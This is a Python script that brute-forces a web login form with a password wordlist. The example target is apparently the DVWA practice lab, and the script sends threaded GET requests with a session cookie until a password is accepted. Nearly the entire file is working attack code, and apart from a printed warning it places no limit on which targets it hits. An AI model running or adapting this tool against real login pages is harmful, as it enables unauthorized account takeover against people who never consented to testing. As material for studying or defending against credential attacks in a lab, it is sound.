#!/usr/bin/env python3
import requests
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor

# Punch-style ASCII Art
WEB_BRUTE_FORCER =  r"""
███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
█████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
"""

# Color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
END = "\033[0m"

def display_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{RED}{BOLD}{WEB_BRUTE_FORCER}{END}")
    print(f"{YELLOW}{BOLD}Developed by hackx(sergeB){END}\n")
    print(f"{RED}⚠ WARNING: For authorized penetration testing only!{END}")
    print(f"{RED}⚠ Unauthorized use is illegal and unethical.{END}\n")

def get_user_input():
    print(f"{CYAN}{BOLD}[CONFIGURATION]{END}")
    target_url = input(f"{BLUE}[?] Target URL (e.g., http://127.0.0.1/DVWA/vulnerabilities/brute/): {END}").strip()
    username = input(f"{BLUE}[?] Username to brute force: {END}").strip()
    wordlist_path = input(f"{BLUE}[?] Path to wordlist file: {END}").strip()
    session_id = input(f"{BLUE}[?] PHPSESSID cookie: {END}").strip()
    threads = int(input(f"{BLUE}[?] Threads (5-10 recommended): {END}").strip() or "5")
    
    return {
        "target_url": target_url,
        "username": username,
        "wordlist_path": wordlist_path,
        "session_id": session_id,
        "threads": threads
    }

def try_password(password, target_url, username, cookies):
    try:
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }
        response = session.get(target_url, params=params, cookies=cookies, timeout=10)
        
        if "incorrect" not in response.text:
            print(f"\n{GREEN}{BOLD}[+] CRACKED! Password found: {password}{END}")
            return True
        else:
            print(f"{YELLOW}[*] Testing: {password.ljust(25)}{END}", end='\r')
            return False
    except Exception as e:
        print(f"{RED}[!] Error trying {password}: {str(e)}{END}")
        return False

def main():
    display_banner()
    config = get_user_input()
    
    # Setup session
    global session
    session = requests.Session()
    cookies = {
        "PHPSESSID": config["session_id"],
        "security": "low"
    }
    
    # Verify wordlist exists
    if not os.path.exists(config["wordlist_path"]):
        print(f"{RED}[-] Wordlist not found: {config['wordlist_path']}{END}")
        exit()

    print(f"\n{PURPLE}{BOLD}[ATTACK STARTED]{END}")
    print(f"{CYAN}[*] Target: {config['target_url']}{END}")
    print(f"{CYAN}[*] Username: {config['username']}{END}")
    print(f"{CYAN}[*] Wordlist: {config['wordlist_path']}{END}")
    print(f"{CYAN}[*] Threads: {config['threads']}{END}")
    print(f"{RED}Press Ctrl+C to stop{END}\n")

    try:
        with open(config["wordlist_path"], 'r', encoding='latin-1') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}[-] Error reading wordlist: {str(e)}{END}")
        exit()

    start_time = time.time()
    found = False

    try:
        with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
            from functools import partial
            try_func = partial(try_password, 
                              target_url=config["target_url"],
                              username=config["username"],
                              cookies=cookies)
            
            for result in executor.map(try_func, passwords):
                if result:
                    found = True
                    executor._threads.clear()
                    break
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Attack interrupted by user{END}")
    
    if not found:
        print(f"\n{RED}[-] Password not found in wordlist{END}")
    
    end_time = time.time()
    print(f"\n{PURPLE}{BOLD}[STATISTICS]{END}")
    print(f"{CYAN}[*] Time elapsed: {round(end_time - start_time, 2)} seconds{END}")
    print(f"{CYAN}[*] Passwords tried: {len(passwords)}{END}")
    print(f"{CYAN}[*] Speed: {round(len(passwords)/(end_time-start_time), 2)} attempts/second{END}")

if __name__ == "__main__":
    main()
